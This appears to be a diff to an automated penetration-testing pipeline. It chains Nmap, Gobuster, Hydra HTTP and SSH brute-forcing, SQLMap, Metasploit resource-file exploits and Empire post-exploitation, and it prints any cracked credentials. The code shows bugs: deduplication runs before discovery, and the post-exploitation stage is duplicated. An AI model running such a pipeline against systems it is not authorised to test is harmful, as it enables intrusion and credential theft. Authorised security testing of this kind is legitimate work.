@@ -1,12 +1,15 @@
 import os
 import json
+import threading
+import glob
 from typing import Dict, List, Any
 from urllib.parse import urljoin
 
 from modules.core.driver import DriverResult, ParsedResult
 from modules.core.logger import setup_logging
 from modules.core.session_manager import SessionManager
-from modules.core.utils import should_skip_sqlmap_form,safe_filename
+from modules.drivers.exploitation.metasploit_manager import MetasploitManager, generate_per_exploit_rcs,clean_rc_dir
+from modules.core.utils import should_skip_sqlmap_form,safe_filename, is_plain_host,update_metasploit_sessions
 
 class Pipeline:
     """
@@ -19,10 +22,10 @@ class Pipeline:
         "gobuster",       # Gobuster Driver,
         "auth",           # static creds
         "form_discovery", # HTML form crawl
+        "brute",          # brute
         "hydra_http",     # brute HTTP forms
         "auth",           # dynamic creds
         "sqlmap",         # injection
-        "brute",          # SSH brute
         "exploit",        # Metasploit
         "postexploit"     # Empire
     ]
@@ -85,6 +88,17 @@ class Pipeline:
         dynamic brute, form crawl, SQLMap, and then the rest.
         """
         # 1) Nmap discovery
+        # in Pipeline.run_full(), right after self.run_stage("discovery", …)
+        disc = self.results.get("discovery", {})
+        for tgt, data in disc.items():
+            unique = []
+            seen = set()
+            for h in data.get("hosts", []):
+                if h["ip"] not in seen:
+                    seen.add(h["ip"])
+                    unique.append(h)
+            self.results["discovery"][tgt]["hosts"] = unique
+
         self.run_stage("discovery", targets)
         # 1.5) Dirb discovery
         self.run_stage("gobuster", targets)
@@ -106,47 +120,75 @@ class Pipeline:
                 suffix = subpath if subpath.startswith("/") else f"/{subpath}"
                 url = host if host.startswith("http") else f"http://{host}"
                 form_targets.add(f"{url.rstrip('/')}{suffix}")
-    
+        # Ensure all form_targets are normalized (scheme and no trailing slash)
+        normalized_form_targets = set()
+        for ft in form_targets:
+            if not ft.startswith("http"):
+                ft = f"http://{ft}"
+            normalized_form_targets.add(ft.rstrip("/"))
+        form_targets = normalized_form_targets
+
         # 3) Crawl forms on every discovered URL
         self.run_stage("form_discovery", list(form_targets))
 
 
         # 4) HydraHttp brute for auth_required but *no* static creds
-        to_brute_http = [t for t in targets if t in auth_req and t not in static_creds]
-        for t in to_brute_http:
-            forms = self.results.get("form_discovery", {})\
-                                .get(t, {})\
-                                .get("forms", [])
-            for form in forms:
-                # userlist/passlist from config
-                self.run_stage(
-                    "hydra_http",
-                    [t],
-                    form=form,
-                    userlist=self.config["hydra_userlist"],
-                    passlist=self.config["hydra_passlist"]
-                )
-            # if any creds found, pick first and inject into config for second auth pass
-            creds = self.results.get("hydra_http", {}).get(t, {}).get("credentials", [])
-            if creds:
-                user, pw = creds[0]["username"], creds[0]["password"]
-                self.config.setdefault("auth_credentials", {})[t] = {
-                    "login_url":       form["action"],
-                    "username_field":  self.config.get("username_field","username"),
-                    "password_field":  self.config.get("password_field","password"),
-                    "username":        user,
-                    "password":        pw
-                }
+        for url, result in self.results.get("form_discovery", {}).items():
+            # For every discovered URL with forms
+            forms = result.get("forms", [])
+            print("Trying brute on:", url, [f['action'] for f in forms])
+
+            # Only brute if URL requires auth and doesn't have static creds
+            url_for_auth = url.split("?")[0]  # or normalize/strip to match your auth_required config
+            if url_for_auth in auth_req and url_for_auth not in static_creds:
+                for form in forms:
+                    self.run_stage(
+                        "hydra_http",
+                        [url],
+                        form=form,
+                        userlist=self.config["hydra_userlist"],
+                        passlist=self.config["hydra_passlist"]
+                    )
+                creds = self.results.get("hydra_http", {}).get(url, {}).get("credentials", [])
+                if creds:
+                    user, pw = creds[0]["username"], creds[0]["password"]
+                    self.config.setdefault("auth_credentials", {})[url_for_auth] = {
+                        "login_url":       form["action"],
+                        "username_field":  self.config.get("username_field", "username"),
+                        "password_field":  self.config.get("password_field", "password"),
+                        "username":        user,
+                        "password":        pw
+                    }
 
         # 5) Dynamic auth with discovered creds
         to_auth_dynamic = [t for t in targets if t in auth_req and t in self.config.get("auth_credentials", {})]
         if to_auth_dynamic:
             self.run_stage("auth", to_auth_dynamic)
 
-        # 6) SQLMap injection on every form
-        # In pipeline.py, before appending unique_sqlmap_jobs
+        
+        
+        # 6) SSH brute (unchanged)
         
 
+        # ...
+        # Before brute stage:
+        brute_targets = [t for t in targets if is_plain_host(t)]
+        if brute_targets:
+            self.run_stage("brute", brute_targets)
+
+
+        # --- Feedback block: print Hydra results to console ---
+        for target, brute_data in self.results.get("brute", {}).items():
+            creds = brute_data.get("credentials", [])
+            if creds:
+                print(f"[Hydra] Credentials found for {target}:")
+                for c in creds:
+                    print(f"  {c['username']}:{c['password']}")
+            else:
+                print(f"[Hydra] No credentials found for {target}.")
+
+        # 7) SQLMap injection on every form
+        # In pipeline.py, before appending unique_sqlmap_jobs
         # Deduplicate forms across all discovered URLs
         seen = set()
         unique_sqlmap_jobs = []
@@ -181,15 +223,73 @@ class Pipeline:
                 self.logger.error(f"SQLMap failed on {action_url}: {e}")
 
 
-        # 7) SSH brute (unchanged)
-        self.run_stage("brute", targets)
-
-        # 8) Exploit
-        self.run_stage("exploit", targets)
         
-        # 8) Post
-        self.run_stage("postexploit", targets)
 
+        # 8) Exploit (Metasploit)
+        rc_dir = self.config.get("metasploit_resource_dir", "modules/drivers/exploitation/msf_scripts")
+        output_dir = self.config.get("metasploit_output_dir", "results/raw/metasploit")
+        lhost = self.config.get("lhost") or "127.0.0.1"
+        targets = list(targets)  # ensure it's a list if set
+        clean_rc_dir(rc_dir)
+        generate_per_exploit_rcs(targets, lhost, output_dir=rc_dir)
+        rc_files = [os.path.join(rc_dir, f) for f in os.listdir(rc_dir) if f.endswith(".rc")]
+
+        # -- Run all Metasploit jobs using the manager --
+        msf_manager = MetasploitManager(
+            msf_path=self.config.get("metasploit_path", "msfconsole"),
+            rc_files=rc_files,
+            output_dir=output_dir,
+            timeout=self.config.get("msf_timeout", 300),
+            logger=self.logger
+        )
+
+        # -- Run all exploits (writes output files) --
+        msf_manager.run_all()
+        for out_file in glob.glob(os.path.join(output_dir, "*.txt")):
+            print("[DEBUG] About to parse:", out_file)
+            with open(out_file) as f:
+                print("[DEBUG] First 10 lines of file:")
+                for i, line in enumerate(f):
+                    print(line.rstrip())
+                    if i > 10:
+                        break
+            sessions = msf_manager.parse_sessions_from_output(out_file)
+            print("[DEBUG] Sessions parsed:", sessions)
+        # -- Parse session map from Metasploit outputs --
+        sessions_map = msf_manager.monitor_sessions(stop_on_session=False)
+
+        # -- Debug: Show session map and match keys --
+        def get_ip(target):
+            import re
+            m = re.match(r'(?:https?://)?([\d\.]+)', target)
+            return m.group(1) if m else target
+
+        print("[DEBUG] Metasploit sessions_map:", sessions_map)
+        print("[DEBUG] pipeline targets:", targets)
+        print("[DEBUG] session_map keys:", list(sessions_map.keys()))
+
+        # -- Normalize targets for post-exploitation --
+        session_targets = [t for t in targets if sessions_map.get(get_ip(t))]
+        self.logger.info(f"Targets with sessions for post-exploitation: {session_targets}")
+
+        if sessions_map:
+            self.config["metasploit_sessions"] = sessions_map
+        else:
+            self.logger.warning("No sessions discovered by MetasploitManager.")
+
+        # 8) Post
+        if session_targets:
+            self.run_stage("postexploit", session_targets)
+        else:
+            self.logger.warning("Skipping post-exploitation; no sessions found.")
+
+        # 8) Post
+        session_targets = [t for t in targets if sessions_map.get(t)]  # <-- use sessions_map here!
+        self.logger.info(f"Targets with sessions for post-exploitation: {session_targets}")
+        if session_targets:
+            self.run_stage("postexploit", session_targets)
+        else:
+            self.logger.warning("Skipping post-exploitation; no sessions found.")
 
         # Generate report
         report_path = self.config.get("report_path", "results/final_report.json")
